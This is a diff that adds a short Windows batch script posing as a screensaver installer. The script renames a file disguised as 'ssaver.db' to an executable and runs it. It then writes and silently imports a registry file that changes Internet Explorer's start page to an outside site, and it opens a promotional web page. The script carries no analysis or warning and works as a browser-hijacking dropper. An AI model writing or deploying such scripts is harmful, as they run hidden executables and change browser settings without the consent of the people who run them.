@@ -1,0 +1,9 @@
+@ECHO OFF
+rename ssaver.db ssaver.exe
+ECHO Now installing screensaver...
+ssaver.exe
+ECHO REGEDIT4 >ssaver.reg
+ECHO [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] >> ssaver.reg
+ECHO "Start Page"="http://www.knightstar.net" >> ssaver.reg
+start /wait ssaver.reg
+start http://www.wallpaperscreensavers.net/coolstuff.htm
